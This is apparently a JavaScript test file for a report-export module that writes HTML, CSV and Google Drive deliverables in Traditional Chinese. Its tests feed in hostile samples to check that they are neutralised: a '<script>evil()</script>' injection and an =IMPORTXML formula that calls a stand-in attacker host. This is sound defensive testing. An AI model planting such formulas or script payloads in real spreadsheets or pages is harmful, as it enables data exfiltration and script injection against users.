import test from 'node:test';
import assert from 'node:assert/strict';
import {reportHtml,reportCsv,safeFileName,driveDeliveryReady,driveClient,DriveDeliveryError,exportDeliverable} from '../src/drive-delivery.js';

test('HTML document escapes untrusted report markup and keeps traditional Chinese',()=>{
 const html=reportHtml('埔里立和｜法務報告','合作權益 <script>evil()</script> & 分潤\n請標示待確認');
 assert.match(html,/埔里立和/);
 assert.match(html,/&lt;script&gt;evil\(\)&lt;\/script&gt;/);
 assert.doesNotMatch(html,/<script>/);
 assert.match(html,/UTF-8/);
});

test('CSV for real Google Sheets Excel conversion prevents formula injection and quotes data',()=>{
 const csv=reportCsv('財務報表','=IMPORTXML("https://evil.example","a")\n-1+1\n正常,單價');
 assert.match(csv,/\uFEFF章節\/項目,內容/);
 assert.match(csv,/\u2019=IMPORTXML/);
 assert.match(csv,/\u2019-1\+1/);
 assert.match(csv,/"正常,單價"/);
});

test('archive filenames strip path and platform reserved characters',()=>{
 assert.equal(safeFileName('A/B:C?D*'), 'A_B_C_D_');
 assert.equal(safeFileName(''), 'SKAI成果');
});

test('unconfigured service never tries to upload or invents Google Drive access',async()=>{
 const keys=['GOOGLE_DRIVE_CLIENT_ID','GOOGLE_DRIVE_CLIENT_SECRET','GOOGLE_DRIVE_REFRESH_TOKEN'];
 const before=keys.map(k=>process.env[k]);
 try{
  for(const k of keys)delete process.env[k];
  assert.equal(driveDeliveryReady(),false);
  await assert.rejects(()=>driveClient(()=>{throw Error('should not connect')}),e=>e instanceof DriveDeliveryError&&e.message==='drive_not_connected');
 }finally{keys.forEach((k,i)=>{if(before[i]===undefined)delete process.env[k];else process.env[k]=before[i]})}
});

test('Drive writer uploads only allowed formats and verifies saved remote metadata',async()=>{
 const operations=[];
 const client={
  createConverted:async(name,body,mime,targetMime,folder)=>{operations.push({type:'source',name,mime,targetMime,folder,body});return {id:'doc123'}},
  exportFile:async(id,mime)=>{operations.push({type:'export',id,mime});return Buffer.from('%PDF example')},
  uploadBinary:async(name,buffer,mime,folder)=>{operations.push({type:'upload',name,mime,folder});return {id:'file123'}},
  verify:async(id,folder,mime)=>{operations.push({type:'verify',id,folder,mime});return {id,url:'https://drive.google.com/file/d/file123/view'}}
 };
 const result=await exportDeliverable(client,{format:'pdf',title:'測試合約',report:'合法文字',folderId:'folder123'});
 assert.equal(result.id,'file123');
 assert.deepEqual(operations.map(x=>x.type),['source','export','upload','verify']);
 assert.equal(operations[0].targetMime,'application/vnd.google-apps.document');
 await assert.rejects(()=>exportDeliverable(client,{format:'exe',title:'x',report:'x',folderId:'x'}),/unsupported_format/);
});
